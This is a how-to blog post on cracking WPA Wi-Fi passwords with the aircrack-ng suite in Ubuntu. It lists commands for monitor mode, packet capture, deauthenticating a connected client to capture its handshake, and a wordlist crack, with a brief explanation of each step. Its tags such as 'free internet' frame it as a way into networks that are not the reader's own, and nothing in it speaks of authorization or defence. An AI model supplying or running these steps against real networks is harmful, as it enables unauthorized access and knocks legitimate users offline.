---
layout: post
published: true
title: Hack WIFI Password WEP/WPA/WPA2
permalink: /hack-wifi-password-wep-wpa-wpa2/
wordpress_id: 1795
categories:
- Howto
- hack
- WEP
- WIFI
- password
- driver
- hack wireless
- wepwpawpa2
- free internet
- active network
- wireless wep key hack
- hack wireless connection free wifi network
- crack wifi network
- wireless password
---




<p>

<strong>Howto crack a WPA network in ubuntu with a wordlist using the aircrack suite.</strong>

<strong>The basic steps are</strong> 
<ul>

	<li>airmon-ng start wlan0</li>
	<li>iwconfig</li>
	<li>airodump-ng mon0</li>
	<li>Hit control + C on my Keyboard</li>
	<li>airodump-ng -c 6 -w output --bssid 00:11:22:33:44:55 mon0 - open another terminal</li>
 	<li>aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 00:22:44:66:88:10 mon0</li>
 	<li>aircrack-ng -w /home/youruser/wordlist.txt -b 00:11:22:33:44:55 output*.cap</li>
</ul>


<strong>Explanations</strong>
<ul>

	<li>This Puts my card into Monitor mode...my particular driver creats another interface called mon0...so i have to use this from now on.</li>
 	<li>Just to check to see that wlan0 is on managed mode and mon0 is on Monitor mode.</li>
 	<li>Starts airodump to view networks...provides necessary info...channel #, mac addy, essid, etc.</li>
 	<li>This stops airodump so we can restart it with the info we need</li>
 	<li>Starts airodump for the network were interested in...the data column should increase for this to work.</li>
 	<li>this step isnt necessary if your on a fairly active network with people connecting frequently...because for wpa you need to capture someone logging into the network...so this command sends a de-authorization request to a client connected so it forces them to reconnect so you can sniff out the handshake. -0 1 is the nuber of de-auth requests...increse the 1 if you need more. -c is a client on the network which you can find from the bottom of the previous terminal for step 5. 7) Starts the aircrack using the wordlist you have</li>
</ul>


</p>
